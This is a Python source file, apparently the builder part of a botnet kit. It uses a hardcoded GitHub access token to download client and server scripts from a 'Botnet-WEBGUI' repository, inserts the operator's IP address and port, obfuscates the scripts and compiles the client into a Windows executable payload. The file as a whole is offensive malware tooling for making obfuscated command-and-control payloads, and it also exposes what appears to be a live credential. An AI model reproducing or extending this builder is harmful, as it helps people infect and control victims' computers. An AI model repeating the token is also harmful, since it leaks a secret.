import os, shutil
from cookies_package import *
from util.plugins.common import clear, cleanup, compile
from colorama import Fore


github_Token    = "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"
client_file     = "raw.githubusercontent.com/Callumgm/Botnet-WEBGUI/master/webgui/client.py"
server_file     = "raw.githubusercontent.com/Callumgm/Botnet-WEBGUI/master/webgui/server.py"


temp = os.getenv("TEMP")

def create_client_payload(ip, port):
    filename = "client_payload"
    clear()
    try:
        print(f"{Fore.GREEN}Creating client payload{Fore.RESET}")
        '''
        Download file from github replace ip and port then obfuscate it and compile it
        '''
        curl_download_github(f"{temp}\\{filename}.py", str(github_Token), str(client_file))

        with open(f"{temp}\\{filename}.py", 'r+') as f:
            replace_string = f.read().replace("IP_HERE", ip).replace("PORT_HERE", port)
        with open(f"{temp}\\{filename}.py", 'w'): pass
        with open(f"{temp}\\{filename}.py", 'r+') as f: f.write(replace_string)

        obfusacate(f"{temp}\\{filename}.py")
        shutil.move(f"{temp}\\{filename}.py", f"{os.getcwd()}\\{filename}.py")

        compile(filename) 
        shutil.move(f"{os.getcwd()}\\dist\\{filename}.exe", f"{os.getcwd()}\\{filename}.exe")
        cleanup(filename)   # Cleanup the files

    except Exception as e:
        print(f'{Fore.LIGHTRED_EX}Error while making exe{Fore.RESET}: {e}')
        cleanup(filename)   # Cleanup the files
        input(f'\n\n{Fore.RESET}[{Fore.YELLOW}>>>{Fore.RESET}] {Fore.CYAN}Enter anything to continue {Fore.RESET}. . .')
        return

    print(f"\n{Fore.GREEN}Finshed creating client{Fore.RESET}\n")
    input(f'{Fore.RESET}[{Fore.YELLOW}>>>{Fore.RESET}] {Fore.CYAN}Enter anything to continue {Fore.RESET}. . .')

def create_server_payload(ip, port, host_ip, host_port):
    filename = "server"
    clear()
    try:
        print(f"{Fore.GREEN}Creating server{Fore.RESET}")
        '''
        Download file from github replace ip and port then obfuscate it and compile it
        '''
        curl_download_github(f"{temp}\\{filename}.py", str(github_Token), str(server_file))

        with open(f"{temp}\\{filename}.py", 'r+') as f: replace_string = f.read().replace("IP_HERE", ip).replace("PORT_HERE", port).replace("HOSTPORTHERE", host_port).replace("HOSTIPHERE", host_ip)
        with open(f"{temp}\\{filename}.py", 'w'): pass
        with open(f"{temp}\\{filename}.py", 'r+') as f: f.write(replace_string)

        obfusacate(f"{temp}\\{filename}.py")
        shutil.move(f"{temp}\\{filename}.py", f"{os.getcwd()}\\{filename}.py")

    except Exception as e:
        print(f'{Fore.LIGHTRED_EX}Error while making server{Fore.RESET}: {e}')
        input(f'\n\n{Fore.RESET}[{Fore.YELLOW}>>>{Fore.RESET}] {Fore.CYAN}Enter anything to continue {Fore.RESET}. . .')
        return

    print(f"\n{Fore.GREEN}Finshed creating server{Fore.RESET}\n")
    input(f'{Fore.RESET}[{Fore.YELLOW}>>>{Fore.RESET}] {Fore.CYAN}Enter anything to continue {Fore.RESET}. . .')